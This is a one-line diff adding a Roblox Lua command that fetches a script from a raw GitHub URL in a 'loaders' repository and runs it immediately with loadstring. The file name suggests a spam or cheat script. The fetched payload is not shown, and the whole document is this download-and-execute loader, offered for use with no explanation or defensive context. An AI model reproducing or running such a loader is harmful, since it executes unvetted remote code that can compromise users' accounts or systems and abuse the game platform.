@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/beta-buddytime-spam3-mst9kfnmfiuexr.lua"))()
